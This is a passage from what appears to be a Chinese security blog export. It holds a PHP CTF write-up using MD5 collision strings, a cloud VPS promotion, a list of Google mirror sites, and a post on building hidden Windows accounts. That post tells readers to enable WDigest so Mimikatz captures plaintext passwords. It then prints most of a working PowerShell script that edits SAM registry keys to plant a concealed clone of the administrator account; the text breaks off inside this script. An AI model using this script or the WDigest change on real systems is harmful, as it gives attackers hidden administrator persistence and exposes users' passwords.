base64_decode($_GET[&apos;file&apos;]);</div><div class=\"line\">$bb = base64_decode($_GET[&apos;file1&apos;]);</div><div class=\"line\">if((md5($aa) == md5($bb) &amp;&amp; $aa !== $bb))&#123;</div><div class=\"line\">\tif(encodeSecret($_GET[&apos;onet&apos;]) == $encodedSecret)&#123;</div><div class=\"line\">\t\techo $flag;</div><div class=\"line\">\t&#125;else&#123;</div><div class=\"line\">\t\techo &apos;come on baby&apos;;</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;else&#123;</div><div class=\"line\">\techo &quot;On On On&quot;;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>get传递file1 file2, 同时要用base64加密, 然后是比较md5</p>\n<p>依然用这两个</p>\n<p><code>s878926199a</code></p>\n<p><code>s1091221200a</code><br><img src=\"http://exp10it.tk/2017/11/17/php-code-writeup/14.jpg\" alt=\"\"><br>Go<br><img src=\"http://exp10it.tk/2017/11/17/php-code-writeup/15.jpg\" alt=\"\"><br>输出come on baby<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">if(encodeSecret($_GET[&apos;onet&apos;]) == $encodedSecret)&#123;</div><div class=\"line\">\techo $flag;</div><div class=\"line\">&#125;else&#123;</div><div class=\"line\">\techo &apos;come on baby&apos;;</div></pre></td></tr></table></figure></p>\n<p>查看encodeSecret<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">function encodeSecret($secret) &#123;</div><div class=\"line\">    return bin2hex(strrev(base64_encode($secret)));</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p><code>Hash:3d3d516343746d4d6d6c315669563362</code></p>\n<p>bin2hex 转16进制</p>\n<p>转回去 pack(“H*”,bin2hex($str))</p>\n<p>strrev 翻转字符串</p>\n<p>只要再翻转一次就可以了</p>\n<p>回到本地<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">function decodeSecret($str)&#123;</div><div class=\"line\">\treturn base64_decode(strrev(pack(&quot;H*&quot;,$str)));</div><div class=\"line\">&#125;</div><div class=\"line\">echo decodeSecret(&apos;3d3d516343746d4d6d6c315669563362&apos;);</div><div class=\"line\">?&gt;</div></pre></td></tr></table></figure></p>\n<p><img src=\"http://exp10it.tk/2017/11/17/php-code-writeup/16.jpg\" alt=\"\">  </p>\n<p>burp构造, 得到了flag  </p>\n<p><img src=\"http://exp10it.tk/2017/11/17/php-code-writeup/17.jpg\" alt=\"\"></p>\n","categories":[],"tags":[]},{"title":"滴滴云免费两个月服务器","url":"http://www.chabug.org/2017/11/10/didiyun-freevps/","content":"<p><img src=\"https://wx2.sinaimg.cn/mw690/7efa749fly1flby2c14utj20nt0ckwhz.jpg\" alt=\"\"><br>滴滴云貌似是滴滴出行搞的云服务。</p>\n<blockquote>\n<p>滴滴云基于滴滴出行的业务技术和经验积累，<br>采用领先的云计算架构、高规格服务器集群搭建、高性能资源配置机制、精细化运营模式，<br>致力于为开发者提供简单快捷、高效稳定、高性价比、安全可靠的IT基础设施云服务。</p>\n</blockquote>\n<p>官网地址<br><a href=\"https://www.didiyun.com/\" target=\"_blank\" rel=\"external\">https://www.didiyun.com/</a></p>\n<p>新人活动<br>新注册滴滴云的用户都可以获得100元新人券。开通最低配置的VPS可以玩2个月！！</p>\n<p>注册步骤<br>访问地址：<a href=\"https://i.didiyun.com/2d5YwCbUWzj\" target=\"_blank\" rel=\"external\">https://i.didiyun.com/2d5YwCbUWzj</a> 注册账号。</p>\n<p>只需要验证邮箱和手机号码！！</p>\n<p>然后账号可以收到100元新人券！！ 开通机器即可！</p>\n<p><strong>开通机器</strong><br>开通机器后登录的用户名不是root。  </p>\n<p>请使用 dc2-user  ，切换到root 请使用命令： su  或者 sudo -i<br><strong>最低配置</strong><br>1核CPU / 512M内存 / 20GSSD / 1M带宽 / KVM虚拟 ≈ 49元/月<br><strong>测试IP</strong><br>103.73.51.200<br><strong>性能测试</strong><br><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div></pre></td><td class=\"code\"><pre><div class=\"line\">----------------------------------------------------------------------</div><div class=\"line\">CPU model            : Intel(R) Xeon(R) CPU E5-<span class=\"number\">2650</span> v4 @ <span class=\"number\">2.20</span>GHz</div><div class=\"line\">Number of cores      : <span class=\"number\">1</span></div><div class=\"line\">CPU frequency        : <span class=\"number\">2197.454</span> MHz</div><div class=\"line\">Total size of Disk   : <span class=\"number\">20.0</span> GB (<span class=\"number\">1.0</span> GB Used)</div><div class=\"line\">Total amount of Mem  : <span class=\"number\">996</span> MB (<span class=\"number\">216</span> MB Used)</div><div class=\"line\">Total amount of Swap : <span class=\"number\">0</span> MB (<span class=\"number\">0</span> MB Used)</div><div class=\"line\">System uptime        : <span class=\"number\">0</span> days, <span class=\"number\">0</span> hour <span class=\"number\">11</span> min</div><div class=\"line\">Load average         : <span class=\"number\">0.08</span>, <span class=\"number\">0.02</span>, <span class=\"number\">0.01</span></div><div class=\"line\">OS                   : CentOS <span class=\"number\">6.9</span></div><div class=\"line\">Arch                 : x86_64 (<span class=\"number\">64</span> Bit)</div><div class=\"line\">Kernel               : <span class=\"number\">2.6</span>.<span class=\"number\">32</span>-<span class=\"number\">696.6</span>.<span class=\"number\">3</span>.el6.x86_64</div><div class=\"line\">----------------------------------------------------------------------</div><div class=\"line\">I/O speed(<span class=\"number\">1</span>st run)   : <span class=\"number\">451</span> MB/s</div><div class=\"line\">I/O speed(<span class=\"number\">2</span>nd run)   : <span class=\"number\">536</span> MB/s</div><div class=\"line\">I/O speed(<span class=\"number\">3</span>rd run)   : <span class=\"number\">634</span> MB/s</div><div class=\"line\">Average I/O speed    : <span class=\"number\">540.3</span> MB/s</div><div class=\"line\">----------------------------------------------------------------------</div></pre></td></tr></table></figure></p>\n","categories":[],"tags":[]},{"title":"Google镜像收集","url":"http://www.chabug.org/2017/11/10/google-mirror/","content":"<h1 id=\"清单\"><a href=\"#清单\" class=\"headerlink\" title=\"清单\"></a>清单</h1><p>清单如下，欢迎提供新镜像。  </p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">名称</th>\n<th style=\"text-align:center\">地址</th>\n<th style=\"text-align:center\">备注</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">皮皮虾</td>\n<td style=\"text-align:center\"><a href=\"https://gg.shadowsocksr.se\" target=\"_blank\" rel=\"external\">https://gg.shadowsocksr.se</a></td>\n<td style=\"text-align:center\">速度不错</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">sapmogy</td>\n<td style=\"text-align:center\"><a href=\"https://so.sapmogy.com/\" target=\"_blank\" rel=\"external\">https://so.sapmogy.com/</a></td>\n<td style=\"text-align:center\">香港机器速度很快</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">futureisnow</td>\n<td style=\"text-align:center\"><a href=\"https://gg.futureisnow.cn/\" target=\"_blank\" rel=\"external\">https://gg.futureisnow.cn/</a></td>\n<td style=\"text-align:center\">ssl有错误</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">uulucky</td>\n<td style=\"text-align:center\"><a href=\"https://google.uulucky.com/\" target=\"_blank\" rel=\"external\">https://google.uulucky.com/</a></td>\n<td style=\"text-align:center\">完美的反代</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">88DR</td>\n<td style=\"text-align:center\"><a href=\"http://www.88dr.com/\" target=\"_blank\" rel=\"external\">http://www.88dr.com/</a></td>\n<td style=\"text-align:center\">狗爹新加坡空间，较慢</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">光的传人</td>\n<td style=\"text-align:center\"><a href=\"http://www.liu16.com/g.html\" target=\"_blank\" rel=\"external\">http://www.liu16.com/g.html</a></td>\n<td style=\"text-align:center\">有广告</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">学术搜索</td>\n<td style=\"text-align:center\"><a href=\"https://so.sciencesoft.cn/\" target=\"_blank\" rel=\"external\">https://so.sciencesoft.cn/</a></td>\n<td style=\"text-align:center\">非原版Google</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">九尾搜索</td>\n<td style=\"text-align:center\"><a href=\"https://a.glgooo.top/\" target=\"_blank\" rel=\"external\">https://a.glgooo.top/</a></td>\n<td style=\"text-align:center\">有广告</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"其他镜像收集站点\"><a href=\"#其他镜像收集站点\" class=\"headerlink\" title=\"其他镜像收集站点\"></a>其他镜像收集站点</h1><table>\n<thead>\n<tr>\n<th style=\"text-align:center\">名称</th>\n<th style=\"text-align:center\">地址</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">coderschool</td>\n<td style=\"text-align:center\"><a href=\"https://coderschool.cn/1853.html\" target=\"_blank\" rel=\"external\">https://coderschool.cn/1853.html</a></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">思谋导航</td>\n<td style=\"text-align:center\"><a href=\"http://dir.scmor.com/google/\" target=\"_blank\" rel=\"external\">http://dir.scmor.com/google/</a></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">自在板</td>\n<td style=\"text-align:center\"><a href=\"http://www.zizaifan.com/html/google.html\" target=\"_blank\" rel=\"external\">http://www.zizaifan.com/html/google.html</a></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">运维网</td>\n<td style=\"text-align:center\"><a href=\"https://www.iyunv.com/thread-135490-1-1.html\" target=\"_blank\" rel=\"external\">https://www.iyunv.com/thread-135490-1-1.html</a></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">那个孩子萌萌哒 abc</td>\n<td style=\"text-align:center\"><a href=\"http://weibo.com/ttarticle/p/show?id=2309404043918147773050\" target=\"_blank\" rel=\"external\">http://weibo.com/ttarticle/p/show?id=2309404043918147773050</a></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">闫珂的博客</td>\n<td style=\"text-align:center\"><a href=\"http://yanke.info/google.htm\" target=\"_blank\" rel=\"external\">http://yanke.info/google.htm</a></td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"更新记录\"><a href=\"#更新记录\" class=\"headerlink\" title=\"更新记录\"></a>更新记录</h1><ul>\n<li>2017/11/10 更新可用</li>\n</ul>\n","categories":[],"tags":[]},{"title":"隐藏用户建立 Powershell","url":"http://www.chabug.org/2017/11/09/UserClone/","content":"<p>最近做测试的时候发现，windows server2012 使用Mimikatz是直接抓不到明文密码的，而且，直接创建的账号登陆有时会碰到这个问题：<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1flc7rmq8coj309i05bglg.jpg\" alt=\"\"></p>\n<blockquote>\n<p>ps：2012抓明文需要HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest的”UseLogonCredential”设置为1，类型为DWORD 32才可以，然后下次用户再登录，才能记录到明文密码。</p>\n</blockquote>\n<p>后来发现以前的建立克隆账号的方式是可以使得新建的账号登陆系统的，为了方便，整理了一个powershell脚本，脚本可以自动修改注册表键值权限（需要用administrator权限运行，及bypassuac以后的权限），之后在进行操作。具体代码如下：<br><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">function</span> Create-Clone</div><div class=\"line\">&#123;</div><div class=\"line\"><span class=\"comment\">&lt;#</span></div><div class=\"line\"><span class=\"comment\"><span class=\"doctag\">.SYNOPSIS</span></span></div><div class=\"line\"><span class=\"comment\">This script requires Administrator privileges. use Invoke-TokenManipulation.ps1 to get system privileges and create the clone user.</span></div><div class=\"line\"><span class=\"comment\"><span class=\"doctag\">.PARAMETER u</span></span></div><div class=\"line\"><span class=\"comment\">The clone username</span></div><div class=\"line\"><span class=\"comment\"><span class=\"doctag\">.PARAMETER p</span></span></div><div class=\"line\"><span class=\"comment\">The clone user's password</span></div><div class=\"line\"><span class=\"comment\"><span class=\"doctag\">.PARAMETER cu</span></span></div><div class=\"line\"><span class=\"comment\">The user to clone, default administrator</span></div><div class=\"line\"><span class=\"comment\"><span class=\"doctag\">.EXAMPLE</span></span></div><div class=\"line\"><span class=\"comment\">Create-Clone -u evi1cg -p evi1cg123 -cu administrator</span></div><div class=\"line\"><span class=\"comment\">#&gt;</span></div><div class=\"line\">    <span class=\"keyword\">Param</span>(</div><div class=\"line\">        [Parameter(Mandatory=<span class=\"literal\">$true</span>)]</div><div class=\"line\">        [String]</div><div class=\"line\">        <span class=\"variable\">$u</span>,</div><div class=\"line\"></div><div class=\"line\">        [Parameter(Mandatory=<span class=\"literal\">$true</span>)]</div><div class=\"line\">        [String]</div><div class=\"line\">        <span class=\"variable\">$p</span>,</div><div class=\"line\"></div><div class=\"line\">        [Parameter(Mandatory=<span class=\"literal\">$false</span>)]</div><div class=\"line\">        [String]</div><div class=\"line\">        <span class=\"variable\">$cu</span> = <span class=\"string\">\"administrator\"</span></div><div class=\"line\">    )</div><div class=\"line\">    <span class=\"keyword\">function</span> upReg&#123;</div><div class=\"line\">        cmd /c <span class=\"string\">\"echo HKEY_LOCAL_MACHINE\\SAM [1 17] &gt;&gt; <span class=\"variable\">$env:temp</span>\\up.ini\"</span></div><div class=\"line\">        cmd /c <span class=\"string\">\"echo HKEY_LOCAL_MACHINE\\SAM\\SAM [1 17] &gt;&gt; <span class=\"variable\">$env:temp</span>\\up.ini\"</span></div><div class=\"line\">        cmd /c <span class=\"string\">\"echo HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains [1 17] &gt;&gt; <span class=\"variable\">$env:temp</span>\\up.ini\"</span></div><div class=\"line\">        cmd /c <span class=\"string\">\"echo HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account [1 17] &gt;&gt; <span class=\"variable\">$env:temp</span>\\up.ini\"</span></div><div class=\"line\">        cmd /c <span class=\"string\">\"echo HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users [1 17] &gt;&gt; <span class=\"variable\">$env:temp</span>\\up.ini\"</span></div><div class=\"line\">        cmd /c <span class=\"string\">\"echo HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names [1 17] &gt;&gt; <span class=\"variable\">$env:temp</span>\\up.ini\"</span></div><div class=\"line\">        cmd /c <span class=\"string\">\"regini <span class=\"variable\">$env:temp</span>\\up.ini\"</span></div><div class=\"line\">        <span class=\"built_in\">Remove-Item</span> <span class=\"variable\">$env:temp</span>\\up.ini</div><div class=\"line\"></div><div class=\"line\">    &#125;</div><div class=\"line\">    <span class=\"keyword\">function</span> downreg &#123;</div><div class=\"line\">        cmd /c <span class=\"string\">\"echo HKEY_LOCAL_MACHINE\\SAM [17] &gt;&gt; <span class=\"variable\">$env:temp</span>\\down.ini\"</span></div><div class=\"line\">        cmd /c <span class=\"string\">\"echo HKEY_LOCAL_MACHINE\\SAM\\SAM [17] &gt;&gt; <span class=\"variable\">$env:temp</span>\\down.ini\"</span></div><div class=\"line\">        cmd /c <span class=\"string\">\"echo HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains [17] &gt;&gt; <span class=\"variable\">$env:temp</span>\\down.ini\"</span></div><div class=\"line\">        cmd /c <span class=\"string\">\"echo HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account [17] &gt;&gt; <span class=\"variable\">$env:temp</span>\\down.ini\"</span></div><div class=\"line\">        cmd /c <span class=\"string\">\"echo HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users [17] &gt;&gt; <span class=\"variable\">$env:temp</span>\\down.ini\"</span></div><div class=\"line\">        cmd /c <span class=\"string\">\"echo HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names [17] &gt;&gt; <span class=\"variable\">$env:temp</span>\\down.ini\"</span></div><div class=\"line\">        cmd /c <span class=\"string\">\"regini <span class=\"variable\">$env:temp</span>\\down.ini\"</span></div><div class=\"line\">        <span class=\"built_in\">Remove-Item</span> <span class=\"variable\">$env:temp</span>\\down.ini</div><div class=\"line\">    &#125;</div><div class=\"line\">    <span class=\"keyword\">function</span> Create-user ([string]<span class=\"variable\">$Username</span>,[string]<span class=\"variable\">$Password</span>) &#123;</div><div class=\"line\">        <span class=\"variable\">$group</span> = <span class=\"string\">\"Administrators\"</span></div><div class=\"line\">        <span class=\"variable\">$existing</span> = <span class=\"built_in\">Test-Path</span> -path <span class=\"string\">\"HKLM:\\SAM\\SAM\\Domains\\Account\\Users\\Names\\<span class=\"variable\">$Username</span>\"</span></div><div class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"variable\">$existing</span>) &#123;</div><div class=\"line\">            <span class=\"built_in\">Write-Host</span> <span class=\"string\">\"[*] Creating new local user <span class=\"variable\">$Username</span> with password <span class=\"variable\">$Password</span>\"</span></div><div class=\"line\">            &amp; NET USER <span class=\"variable\">$Username</span> <span class=\"variable\">$Password</span> /add /y /expires:never | <span class=\"built_in\">Out-Null</span></div><div class=\"line\">            <span class=\"built_in\">Write-Host</span> <span class=\"string\">\"[*] Adding local user <span class=\"variable\">$Username</span> to <span class=\"variable\">$group</span>.\"</span></div><div class=\"line\">            &amp; NET LOCALGROUP <span class=\"variable\">$group</span> <span class=\"variable\">$Username</span> /add | <span class=\"built_in\">Out-Null</span></div><div class=\"line\"></div><div class=\"line\">        &#125;</div><div class=\"line\">        <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">            <span class=\"variable\">$adsi</span> = [ADSI]<span class=\"string\">\"WinNT://<span class=\"variable\">$env:COMPUTERNAME</span>\"</span></div><div class=\"line\">            <span class=\"variable\">$exist</span> = <span class=\"variable\">$adsi</span>.Children | where &#123;<span class=\"variable\">$_</span>.SchemaClassName <span class=\"nomarkup\">-eq</span> <span class=\"string\">'user'</span> -and <span class=\"variable\">$_</span>.Name <span class=\"nomarkup\">-eq</span> <span class=\"variable\">$Username</span> &#125;</div><div class=\"line\">            <span class=\"built_in\">Write-Host</span> <span class=\"string\">\"[*] Setting password for existing local user <span class=\"variable\">$Username</span>\"</span></div><div class=\"line\">            <span class=\"variable\">$exist</span>.SetPassword(<span class=\"variable\">$Password</span>)</div><div class=\"line\">        &#125;</div><div class=\"line\"></div><div class=\"line\">        <span class=\"built_in\">Write-Host</span> <span class=\"string\">\"[*] Ensuring password for <span class=\"variable\">$Username</span> never expires.\"</span></div><div class=\"line\">        &amp; WMIC USERACCOUNT WHERE <span class=\"string\">\"Name='<span class=\"variable\">$Username</span>'\"</span> SET PasswordExpires=FALSE   | <span class=\"built_in\">Out-Null</span>  </div><div class=\"line\">    &#125;</div><div class=\"line\">    <span class=\"keyword\">function</span> GetUser-Key([string]<span class=\"variable\">$user</span>)</div><div class=\"line\">    &#123;</div><div class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"built_in\">Test-Path</span> -Path <span class=\"string\">\"HKLM:\\SAM\\SAM\\Domains\\Account\\Users\\Names\\<span class=\"variable\">$user</span>\"</span>)&#123;</div><div class=\"line\">            cmd /c <span class=\"string\">\"regedit /e <span class=\"variable\">$env:temp</span>\\<span class=\"variable\">$user</span>.reg \"</span>HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names\\<span class=\"variable\">$user</span><span class=\"string\">\"\"</span></div><div class=\"line\">            <span class=\"variable\">$file</span> = <span class=\"built_in\">Get-Content</span> <span class=\"string\">\"<span class=\"variable\">$env:temp</span>\\<span class=\"variable\">$user</span>.reg\"</span>  | <span class=\"built_in\">Out-String</span></div><div class=\"line\">            <span class=\"variable\">$pattern</span>=<span class=\"string\">\"@=hex\\((.*?)\\)\\:\"</span></div><div class=\"line\">            <span class=\"variable\">$file</span> <span class=\"nomarkup\">-match</span> <span class=\"variable\">$pattern</span> |<span class=\"built_in\">Out-Null</span></div><div class=\"line\">            <span class=\"variable\">$key</span> = <span class=\"string\">\"00000\"</span>+<span class=\"variable\">$matches</span>[<span class=\"number\">1</span>]</div><div class=\"line\">            <span class=\"built_in\">Write-Host</span> <span class=\"string\">\"[!]\"</span><span class=\"variable\">$key</span></div><div class=\"line\">            <span class=\"keyword\">return</span> <span class=\"variable\">$key</span></div><div class=\"line\">        &#125;<span class=\"keyword\">else</span> &#123;</div><div class=\"line\">            <span class=\"built_in\">Write-Host</span> <span class=\"string\">\"[-] SomeThing Wrong !\"</span></div><div class=\"line\">        &#125;</div><div class=\"line\"></div><div class=\"line\">    &#125;</div><div class=\"line\">    <span class=\"keyword\">function</span> Clone ([string]<span class=\"variable\">$ukey</span>,[string]<span class=\"variable\">$cukey</span>) &#123;</div><div class=\"line\">        <span class=\"variable\">$ureg</span> = <span class=\"string\">\"HKLM:\\SAM\\SAM\\Domains\\Account\\Users\\<span class=\"variable\">$ukey</span>\"</span> |<span class=\"built_in\">Out-String</span></div><div class=\"line\">        <span class=\"variable\">$cureg</span> = <span class=\"string\">\"HKLM:\\SAM\\SAM\\Domains\\Account\\Users\\<span class=\"variable\">$cukey</span>\"</span> |<span class=\"built_in\">Out-String</span></div><div class=\"line\">        <span class=\"built_in\">Write-Host</span> <span class=\"string\">\"[*] Get clone user'F value\"</span></div><div class=\"line\">        <span class=\"variable\">$cuFreg</span> = <span class=\"built_in\">Get-Item</span> -Path <span class=\"variable\">$cureg</span>.Trim()</div><div class=\"line\">        <span class=\"variable\">$cuFvalue</span> = <span class=\"variable\">$cuFreg</span>.GetValue(<span class=\"string\">'F'</span>)</div><div class=\"line\">        <span class=\"built_in\">Write-Host</span> <span class=\"string\">\"[*] Change user'F value\"</span></div><div class=\"line\">        <span class=\"built_in\">Set-ItemProperty</span> -path <span class=\"variable\">$ureg</span>.Trim()  -Name <span class=\"string\">\"F\"</span> -value <span class=\"variable\">$cuFvalue</span></div><div class=\"line\">        <span class=\"variable\">$outreg</span> = <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\<span class=\"variable\">$ukey</span>\"</span></div><div class=\"line\">        cmd /c <span class=\"string\">\"regedit /e <span class=\"variable\">$env:temp</span>\\out.reg <span class=\"variable\">$outreg</span>.Trim()\"</span></div><div class=\"line\">    &#125;</div><div class=\"line\">    <span class=\"keyword\">function</span> Main () &#123;</div><div class=\"line\">        <span class=\"built_in\">Write-Output</span> <span class=\"string\">\"[*] Start\"</span></div><div class=\"line\">        <span class=\"built_in\">Write-Output</span> <span class=\"string\">\"[*] Tring to change reg privilege !\"</span></div><div class=\"line\">        upReg   </div><div class=\"line\">        <span class=\"keyword\">if</span>( !(<span class=\"built_in\">Test-Path</span> -path <span class=\"string\">\"HKLM:\\SAM\\SAM\\Domains\\Account\\Users\\Names\\<span class=\"variable\">$cu</span>\"</span>))&#123;</div><div class=\"line\">            <span class=\"built_in\">Write-Host</span> <span class=\"string\">\"[-] The User to Clone does not exist\"</span></div><div class=\"line\">            <span class=\"built_in\">Write-Output</span> <span class=\"string\">\"[*] Change reg privilege back !\"</span></div><div class=\"line\">            downReg   </div><div class=\"line\">            <span class=\"built_in\">Write-Output</span> <span class=\"string\">\"[*] Exiting !\"</span></div><div class=\"line\">        &#125;</div><div class=\"line\">        <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">            <span class=\"keyword\">if</span>(!(<span class=\"built_in\">Test-Path</span> -path <span class=\"string\">\"HKLM:\\SAM\\SAM\\Domains\\Account\\Users\\Names\\<span class=\"variable\">$u</span>\"</span>))&#123;</div><div class=\"line\">                <span class=\"variable\">$tmp</span> = <span class=\"string\">\"1\"</span></div><div class=\"line\">            &#125;</div><div class=\"line\">            <span class=\"keyword\">else</span>&#123;</div><div class=\"line\">                <span class=\"variable\">$tmp</span> = <span class=\"string\">\"0\"</span></div><div class=\"line\">            &#125;</div><div class=\"line\">            <span class=\"built_in\">Write-Output</span> <span class=\"string\">\"[*] Create User...\"</span></div><div class=\"line\">            Create-user <span class=\"variable\">$u</span> <span class=\"variable\">$p</span></div><div class=\"line\">            <span class=\"built_in\">Write-Output</span> <span class=\"string\">\"[*] Get User <span class=\"variable\">$u</span>'s  Key ..\"</span></div><div class=\"line\">            <span class=\"variable\">$ukey</span> = GetUser-Key <span class=\"variable\">$u</span> |<span class=\"built_in\">Out-String</span></div><div class=\"line\">            <span class=\"built_in\">Write-Output</span> <span class=\"string\">\"[*] Get User <span class=\"variable\">$cu</span>'s  Key ..\"</span></div><div class=\"line\">            <span class=\"variable\">$cukey</span> = GetUser-Key <span class=\"variable\">$cu</span> |<span class=\"built_in\">Out-String</span></div><div class=\"line\">            <span class=\"built_in\">Write-Output</span> <span class=\"string\">\"[*] Clone User..\"</span></div><div class=\"line\">            Clone <span class=\"variable\">$ukey</span> <span class=\"variable\">$cukey</span></div><div class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable\">$tmp</span> <span class=\"nomarkup\">-eq</span> <span class=\"number\">1</span> )&#123;</div><div class=\"line\">                <span class=\"built_in\">Write-Output</span> <span class=\"string\">\"[*] Delete User..\"</span></div><div class=\"line\">                cmd /c <span class=\"string\">\"net User <span class=\"variable\">$u</span> /del \"</span> |<span class=\"built_in\">Out-Null</span></div><div class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123; <span class=\"built_in\">Write-Output</span> <span class=\"string\">\"[*] Don't need to delete..\"</span>&#125;</div><div class=\"line\">            cmd /c <span class=\"string\">\"regedit /s <span class=\"variable\">$env:temp</span>\\<span class=\"variable\">$u</span>.reg\"</span></div><div class=\"line\">            cmd /c <span class=\"string\">\"regedit /s <span class=\"variable\">$env:temp</span>\\out.reg\"</span></div><div class=\"line\">            <span class=\"built_in\">Remove-Item</span> <span class=\"variable\">$env:temp</span>\\*.reg</div><div class=\"line\">            <span class=\"built_in\">Write-Output</span> <span class=\"string\">\"[*] Change reg privilege back !\"</span></div><div class=\"line\">            downreg</div><div class=\"line\">            <span 